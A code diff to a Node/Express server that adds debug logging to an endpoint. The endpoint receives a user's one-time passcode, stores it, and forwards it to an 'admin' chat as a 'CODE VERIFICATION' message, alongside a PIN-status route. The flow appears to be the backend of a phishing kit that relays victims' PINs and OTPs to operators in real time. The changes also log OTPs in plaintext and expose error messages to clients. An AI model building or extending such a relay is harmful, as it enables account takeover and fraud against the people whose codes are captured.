@@ -974,29 +974,44 @@ app.get('/api/check-pin-status/:applicationId', async (req, res) => {
 });
 
 app.post('/api/verify-otp', async (req, res) => {
+    console.log('\n🔵 ===== /api/verify-otp CALLED =====');
+    console.log('Request body:', JSON.stringify(req.body));
+    
     try {
         const { applicationId, otp } = req.body;
+        
+        console.log(`📝 Received: applicationId=${applicationId}, otp=${otp}`);
+        
         const application = await db.getApplication(applicationId);
+        console.log(`📊 Application found:`, application ? 'YES' : 'NO');
         
         if (!application) {
+            console.error(`❌ Application ${applicationId} not found in database`);
             return res.status(404).json({ success: false, message: 'Application not found' });
         }
         
+        console.log(`👤 Admin ID: ${application.adminId}`);
+        console.log(`🗺️ Admin in map: ${adminChatIds.has(application.adminId)}`);
+        
         if (!adminChatIds.has(application.adminId)) {
+            console.log(`⚠️ Admin ${application.adminId} not in active map, trying to re-add...`);
             // Try to add admin to map if they have chatId
             const admin = await db.getAdmin(application.adminId);
             if (admin && admin.chatId) {
                 adminChatIds.set(application.adminId, admin.chatId);
-                console.log(`➕ Re-added admin to map: ${application.adminId}`);
+                console.log(`➕ Re-added admin to map: ${application.adminId} -> ${admin.chatId}`);
             } else {
+                console.error(`❌ Admin ${application.adminId} not available - no chatId`);
                 return res.status(500).json({ success: false, message: 'Admin unavailable' });
             }
         }
         
+        console.log(`💾 Updating application with OTP: ${otp}`);
         await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });
-        console.log(`💾 OTP saved for ${applicationId}: ${otp}`);
+        console.log(`✅ OTP saved for ${applicationId}: ${otp}`);
         
-        await sendToAdmin(application.adminId, `
+        console.log(`📤 Sending message to admin ${application.adminId}...`);
+        const sent = await sendToAdmin(application.adminId, `
 📲 *CODE VERIFICATION*
 
 📋 \`${applicationId}\`
@@ -1016,11 +1031,22 @@ app.post('/api/verify-otp', async (req, res) => {
             }
         });
         
+        if (sent) {
+            console.log(`✅ Message sent successfully to admin`);
+        } else {
+            console.error(`❌ Failed to send message to admin`);
+        }
+        
+        console.log(`📤 Sending success response to client`);
         res.json({ success: true });
+        console.log(`🔵 ===== /api/verify-otp COMPLETED =====\n`);
         
     } catch (error) {
-        console.error('Error in verify-otp:', error);
-        res.status(500).json({ success: false, message: 'Server error' });
+        console.error('\n❌❌❌ ERROR in /api/verify-otp ❌❌❌');
+        console.error('Error message:', error.message);
+        console.error('Error stack:', error.stack);
+        console.error('❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌\n');
+        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
     }
 });
 
